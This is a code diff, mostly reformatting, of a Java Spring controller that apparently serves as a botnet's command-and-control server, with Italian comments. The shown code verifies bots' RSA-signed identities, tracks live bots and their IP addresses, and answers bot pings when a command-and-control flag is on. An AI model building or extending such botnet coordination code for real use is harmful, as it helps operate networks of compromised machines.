@@ -77,24 +77,25 @@ public class CommandController {
 				if (b != null) {
 					System.out.println("conosco gia il bot");
 					try {
-						flag = cmm.getPki().validateSignedMessageRSA(idBot, idBotSign,cmm.getPki().rebuildPuK(b.getPubKey()));
-						System.out.println("Ritorno verifica "+flag);
-						if (flag){
+						flag = cmm.getPki().validateSignedMessageRSA(idBot, idBotSign,
+								cmm.getPki().rebuildPuK(b.getPubKey()));
+						System.out.println("Ritorno verifica " + flag);
+						if (flag) {
 							Pairs<IP, String> botAlive = new Pairs<IP, String>(new IP(req.getRemoteAddr()), idBot);
 							cmm.getnServ().getAliveBot().add(botAlive);
-							if(!b.getIp().equals(botAlive.getValue1().toString())){
+							if (!b.getIp().equals(botAlive.getValue1().toString())) {
 								b.setIp(botAlive.getValue1().toString());
 								cmm.getbServ().updateBot(b);
 							}
 							response = new Pairs<Long, Integer>(new Long(-1), -1);
 						}
-							
+
 						else
 							response = cmm.authReq(idBot);
 					} catch (InvalidKeyException | SignatureException e) {
 						e.printStackTrace();
 					}
-				} else 
+				} else
 					response = cmm.authReq(idBot);
 			}
 		} else {
@@ -120,28 +121,8 @@ public class CommandController {
 		return response;
 	}
 
-	/////////////////////////////////////////////////////////////////////////
-
-	@RequestMapping(value = "/prova", method = RequestMethod.GET)
-	@ResponseBody
-	public String prova() {
-
-		return "";
-	}
-
-	// Controller che intercetta i ping dei bot
-	@RequestMapping(value = "/BotPing", method = RequestMethod.POST)
-	@ResponseBody
-	public String BotPing(HttpServletResponse error) throws IOException {
-		String response = "";
-		if (configEngine.isCommandandconquerStatus()) {
-			response = "ping";
-		} else {
-			error.sendError(HttpStatus.SC_NOT_FOUND);
-		}
-		return response;
-	}
-
+	///////////////////////////////////////////////////////////////////////////
+	//// CONTROLLER PER LA GESTIONE DELLE RICHIESTE DI MIGRAZIONE DATABASE////
 	@RequestMapping(value = "/newKing/roles", method = RequestMethod.POST)
 	@ResponseBody
 	public List<Role> newKingRoles(@RequestBody String idBot, HttpServletRequest req) {
@@ -224,6 +205,8 @@ public class CommandController {
 		return true;
 	}
 
+	/////////////////////////////////////////////////////////////////////////
+
 	// TODO RIMUOVERE TEST
 	@RequestMapping(value = "/election", method = RequestMethod.GET)
 	@ResponseBody
@@ -235,8 +218,21 @@ public class CommandController {
 		return true;
 	}
 
+	// Controller che intercetta i ping dei bot
+	@RequestMapping(value = "/BotPing", method = RequestMethod.POST)
+	@ResponseBody
+	public String BotPing(HttpServletResponse error) throws IOException {
+		String response = "";
+		if (configEngine.isCommandandconquerStatus()) {
+			response = "ping";
+		} else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
+		return response;
+	}	
+	
+	
 	// Deprecated
-
 	// @RequestMapping(value = "/newKing", method = RequestMethod.POST)
 	// @ResponseBody
 	//
